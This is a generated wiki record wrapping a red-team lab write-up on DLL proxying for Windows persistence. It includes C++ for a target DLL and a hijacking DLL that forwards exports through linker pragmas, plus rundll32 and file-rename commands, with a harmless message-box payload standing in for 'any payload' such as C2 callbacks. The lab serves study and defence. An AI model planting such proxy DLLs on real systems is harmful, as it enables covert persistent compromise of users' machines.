---
parsed_by: focuslocust
source: redteamingtactics
type: generated
---
# DLL Proxying for Persistence

[Home](../../../README.md)

## Provenance

| Field | Value |
| --- | --- |
| Source | `redteamingtactics` |
| Type | `redteaming-topic` |
| Record ID | `rtt-offensive-security-persistence-dll-proxying-for-persistence` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/redteaming-tactics-and-techniques/offensive-security/persistence/dll-proxying-for-persistence.md` |
| Parsed by | `focuslocust` |
| Relationship mode | `explicit / conservative inferred / manual` |

## Generated Concept Page

- [DLL Proxying for Persistence](../../topics/offensive-security/dll-proxying-for-persistence.md)

## Extracted Fields

| Field | Value |
| --- | --- |
| id | rtt-offensive-security-persistence-dll-proxying-for-persistence |
| name | DLL Proxying for Persistence |
| type | redteaming-topic |
| source | redteamingtactics |
| url | https://github.com/mantvydasb/RedTeaming-Tactics-and-Techniques/blob/master/offensive-security/persistence/dll-proxying-for-persistence.md |

## Preserved Source Material

````yaml
_asset_filenames:
- dll-proxying-forwarding-in-action.gif
- image (638).png
- image (639).png
- image (643).png
- image (644).png
- image (645).png
- image (654).png
- rename-files.gif
_body: "# DLL Proxying for Persistence\n\nThis is a quick lab to get familiar with a technique that's been on my todo list\
  \ for some time - DLL proxying. This technique could be used for persistence or to intercept data, but in this lab, I am\
  \ only concerned with persistence.\n\n## Overview\n\nIn the context of malware, DLL proxying is a DLL hijacking technique,\
  \ where a legitimate DLL say, `legit.dll` is renamed to `legit1.dll` and a malicious dll, which exports **all** the same\
  \ functions that the `legit1.dll` exports, is placed instead of `legit.dll`.\n\nOnce the dll is hijacked, whenever a program\
  \ calls a function, say `exportedFunction1` from `legit.dll`, here is what happens:\n\n* `legit.dll` gets loaded into the\
  \ calling process and executes its malicious code, say reaches out to the C2\n* `legit.dll` forwards the call to `exportedFunction1`\
  \ in `legit1.dll`\n* `legit1.dll` executes the `exportedFunction1`\n\nThis function forwarding from one DLL to another is\
  \ what gives the technique its name - DLL proxying, since the malicious DLL is sitting in between the application calling\
  \ the exported function and a legitimate DLL that implements that exported function.\n\nAt a high-level, below diagram shows\
  \ how it all looks before and after the DLL is hijacked:\n\n![](<../../.gitbook/assets/image (654).png>)\n\n## Walkthrough\n\
  \nAt a high level, the technique works as follows:\n\n1. Decide on which DLL to hijack. Let's say, it's located in c:\\\
  temp\\legit.dll. Move it to c:\\temp\\legit1.dll\n2. Get a list of all the exported functions of c:\\temp\\legit1.dll\n\
  3. Create a malicious DLL malicious.dll, that once loaded by the target process, executes your payload\n4. Inside the malicious.dll,\
  \ redirect/forward **all** the exported functions by legit.dll (this is the DLL we are hijacking) to legit1.dll (this is\
  \ still the same DLL we are hijacking, just with a new name)&#x20;\n5. Copy malicious.dll to c:\\temp\\legit.dll\n6. At\
  \ this point, any program that calls an **any** exported function in legit.dll will now execute your malicious payload and\
  \ then transfer the execution to the same exported function in c:\\temp\\legit1.dll.\n\n### Target DLL\n\nFor demo purposes,\
  \ we will create our own DLL legitimate DLL to be hijacked, called `legit.dll`:\n\n{% tabs %}\n{% tab title=\"legit-dll.cpp\"\
  \ %}\n```cpp\n#include \"pch.h\"\n\nBOOL APIENTRY DllMain( HMODULE hModule,\n                       DWORD  ul_reason_for_call,\n\
  \                       LPVOID lpReserved\n                     )\n{\n    switch (ul_reason_for_call)\n    {\n    case DLL_PROCESS_ATTACH:\n\
  \    case DLL_THREAD_ATTACH:\n    case DLL_THREAD_DETACH:\n    case DLL_PROCESS_DETACH:\n        break;\n    }\n    return\
  \ TRUE;\n}\n\nextern \"C\" __declspec(dllexport) VOID exportedFunction1(int a)\n{\n    MessageBoxA(NULL, \"Hi from legit\
  \ exportedFunction1\", \"Hi from legit exportedFunction1\", 0);\n}\n\nextern \"C\" __declspec(dllexport) VOID exportedFunction2(int\
  \ a)\n{\n    MessageBoxA(NULL, \"Hi from legit exportedFunction2\", \"Hi from legit exportedFunction2\", 0);\n}\n\nextern\
  \ \"C\" __declspec(dllexport) VOID exportedFunction3(int a)\n{\n    MessageBoxA(NULL, \"Hi from legit exportedFunction3\"\
  , \"Hi from legit exportedFunction3\", 0);\n}\n```\n{% endtab %}\n{% endtabs %}\n\nLet's say we've now compiled the above\
  \ as a `legit.dll` to `c:\\temp\\legit.dll`. It has 3 exported functions as shown below:\n\n<div align=\"center\">\n\n<img\
  \ src=\"../../.gitbook/assets/image (638).png\" alt=\"\">\n\n</div>\n\nTo confirm the DLL works, we can see that calling\
  \ `exportedFunction1` from inside the `legit.dll` gives a popup like this:\n\n```\nrundll32 c:\\temp\\legit.dll,exportedFunction1\n\
  ```\n\n![](<../../.gitbook/assets/image (639).png>)\n\nWe now have the `legit.dll` and its target function `exportedFunction1`\
  \ to hijack, let's move on to the malicious DLL that will do the function proxying.\n\n### Malicious DLL\n\nLet's now create\
  \ the `malicious.dll` - we will be using it to hijack programs that call functions from `c:\\temp\\legit.dll`. Compile the\
  \ below as a `malicious.dll`:\n\n{% tabs %}\n{% tab title=\"malicious-dll.cpp\" %}\n```cpp\n#include \"pch.h\"\n\n#pragma\
  \ comment(linker, \"/export:exportedFunction1=legit1.exportedFunction1\")\n#pragma comment(linker, \"/export:exportedFunction2=legit1.exportedFunction2\"\
  )\n#pragma comment(linker, \"/export:exportedFunction3=legit1.exportedFunction3\")\n\nBOOL APIENTRY DllMain( HMODULE hModule,\n\
  \                       DWORD  ul_reason_for_call,\n                       LPVOID lpReserved\n                     )\n{\n\
  \    \n    switch (ul_reason_for_call)\n    {\n    case DLL_PROCESS_ATTACH:\n    {\n        MessageBoxA(NULL, \"Hi from\
  \ malicious dll\", \"Hi from malicious dll\", 0);\n    }\n    case DLL_THREAD_ATTACH:\n    case DLL_THREAD_DETACH:\n   \
  \ case DLL_PROCESS_DETACH:\n        break;\n    }\n    return TRUE;\n}\n```\n{% endtab %}\n{% endtabs %}\n\nThe key piece\
  \ in the `malicious.dll` is the `#pragma` comment at the top, that tells the linker to export / forward (technical name\
  \ is `Forward Export`) functions `exportedFunction1`, `exportedFunction2`, `exportedFunction3` to the module `legit1.dll`.\n\
  \nAlso, note that once the `malicious.dll` is loaded, it will display a prompt saying `Hi from malicious dll`, but this\
  \ could be any payload of our choice:\n\n![](<../../.gitbook/assets/image (645).png>)\n\nLet's test if the `malicious.dll`\
  \ executes our payload - shows a message prompt:\n\n```\nrundll32 malicious.dll,whatever\n```\n\n![](<../../.gitbook/assets/image\
  \ (643).png>)\n\n### DLL Proxying / Hijacking\n\nWe now have all the required pieces to test the dll proxying concept.&#x20;\n\
  \nLet's move the `malicious.dll` to `c:\\temp`, where `legit.dll` resides:\n\n![](<../../.gitbook/assets/image (644).png>)\n\
  \nRename the `legit.dll` to `legit1.dll` and `alicious.dll` to `legit.dll`:\n\n```\nmv .\\legit.dll .\\legit1.dll; mv .\\\
  malicious.dll .\\legit.dll\n```\n\n![](../../.gitbook/assets/rename-files.gif)\n\n### Moment of Truth\n\nNow, let's invoke\
  \ the `exportedFunction1` from `legit.dll` - this is our malicious DLL with DLL proxying enabled.\n\nIf the hijacking is\
  \ successful, we will see the prompt `Hi from malicious dll` followed by the prompt `Hi from legit exportedFunction1` from\
  \ the `legit1.dll`:\n\n![Successful DLL proxying in action](../../.gitbook/assets/dll-proxying-forwarding-in-action.gif)\n\
  \nImplementing DLL proxying for a DLL that exports many functions may be a bit painful, but luckily there are multiple projects\
  \ that help you automate this process, one of which is [https://github.com/Flangvik/SharpDllProxy](https://github.com/Flangvik/SharpDllProxy),\
  \ so go check it out.\n\n## References\n\n[https://dl.packetstormsecurity.net/papers/win/intercept\\_apis\\_dll\\_redirection.pdf](https://dl.packetstormsecurity.net/papers/win/intercept\\\
  _apis\\_dll\\_redirection.pdf)"
_relative_path: offensive-security/persistence/dll-proxying-for-persistence.md
_source_path: /home/adams/scorchederf/focuslocust/.cache/redteaming-tactics-and-techniques/offensive-security/persistence/dll-proxying-for-persistence.md
````
